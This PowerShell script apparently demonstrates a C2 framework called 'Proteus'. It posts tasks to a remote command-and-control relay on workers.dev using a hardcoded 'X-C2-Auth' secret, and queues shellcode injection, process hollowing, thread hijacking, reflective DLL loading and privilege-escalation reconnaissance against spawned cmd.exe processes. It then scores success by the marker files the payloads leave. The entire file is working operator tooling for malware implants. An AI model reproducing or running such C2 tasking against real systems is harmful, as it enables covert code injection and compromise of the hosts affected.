$headers = @{ "X-C2-Auth" = "supersecret123" }
$base    = "https://jockey-relay.dm2528v.workers.dev"
$agentId = "agent-188a53aaaba40df1"
$uri     = "$base/api/v1/script/deploy"

function Deploy($name, $code) {
    $body = @{ name = $name; agent_ids = @($agentId); code = $code } | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Method POST -Uri $uri -Headers $headers -ContentType "application/json" -Body $body | Out-Null
}

function Spawn-Target {
    Start-Process cmd.exe -ArgumentList "/k timeout /t 300 /nobreak" -WindowStyle Minimized
    Start-Sleep 2
    (Get-Process cmd | Sort-Object StartTime -Descending | Select-Object -First 1).Id
}

Write-Host ""
Write-Host "=================================================" -ForegroundColor Cyan
Write-Host " Proteus Framework - Full Demonstration" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan
Write-Host ""

# Clean state
Remove-Item "$env:TEMP\INJ_*.txt","C:\Windows\Temp\INJ_*.txt" -EA SilentlyContinue
Get-Process cmd -EA SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force
Start-Sleep 1

# Spawn three separate targets
$t1 = Spawn-Target
$t2 = Spawn-Target
$t3 = Spawn-Target

Write-Host "Spawned 3 targets: $t1, $t2, $t3" -ForegroundColor DarkGray
Write-Host ""

# Queue all tasks in one shot
Write-Host "[Queue] shellcode -> $t1" -ForegroundColor Yellow
Deploy "demo-shellcode" "inject shellcode $t1 /payloads/sc_shellcode.bin"

Write-Host "[Queue] hollow (spawns own target)" -ForegroundColor Yellow
Deploy "demo-hollow" 'inject hollow C:\Windows\System32\cmd.exe /payloads/hollow_payload.exe'

Write-Host "[Queue] hijack -> $t2" -ForegroundColor Yellow
Deploy "demo-hijack" "inject hijack $t2 /payloads/sc_hijack.bin"

Write-Host "[Queue] reflect -> $t3" -ForegroundColor Yellow
Deploy "demo-reflect" "inject reflect $t3 /payloads/reflective_payload.dll"

Write-Host "[Queue] privesc info" -ForegroundColor Yellow
Deploy "demo-privesc" "privesc info"

Write-Host ""
Write-Host "All 5 tasks queued. Agent polls every 30s." -ForegroundColor DarkGray
Write-Host "Waiting 90 seconds for completion..." -ForegroundColor DarkGray
Write-Host ""

# Progress ticker
for ($i = 0; $i -lt 9; $i++) {
    Start-Sleep 10
    $elapsed = ($i + 1) * 10
    Write-Host "  ... $elapsed s" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "=== Results ===" -ForegroundColor Cyan

$r1 = Test-Path "$env:TEMP\INJ_shellcode.txt"
$r2 = Test-Path "$env:TEMP\INJ_hollowing.txt"
$r3 = Test-Path "$env:TEMP\INJ_hijack.txt"
$r4 = Test-Path "$env:TEMP\INJ_reflective.txt"

Write-Host "  shellcode:  $(if($r1){'PASS'}else{'FAIL'})" -ForegroundColor $(if($r1){"Green"}else{"Red"})
Write-Host "  hollow:     $(if($r2){'PASS'}else{'FAIL'})" -ForegroundColor $(if($r2){"Green"}else{"Red"})
Write-Host "  hijack:     $(if($r3){'PASS'}else{'FAIL'})" -ForegroundColor $(if($r3){"Green"}else{"Red"})
Write-Host "  reflect:    $(if($r4){'PASS'}else{'FAIL'})" -ForegroundColor $(if($r4){"Green"}else{"Red"})

# Fallback paths (in case GetTempPathA returned C:\Windows\Temp)
if (-not $r2 -and (Test-Path "C:\Windows\Temp\INJ_hollowing.txt")) {
    $r2 = $true
    Write-Host "  (hollow marker found in C:\Windows\Temp)" -ForegroundColor DarkGray
}

$score = @($r1,$r2,$r3,$r4 | Where-Object { $_ }).Count
Write-Host ""
Write-Host "===================" -ForegroundColor Cyan
Write-Host " FINAL SCORE: $score / 4" -ForegroundColor $(if($score -eq 4){"Green"}else{"Yellow"})
Write-Host "===================" -ForegroundColor Cyan
Write-Host ""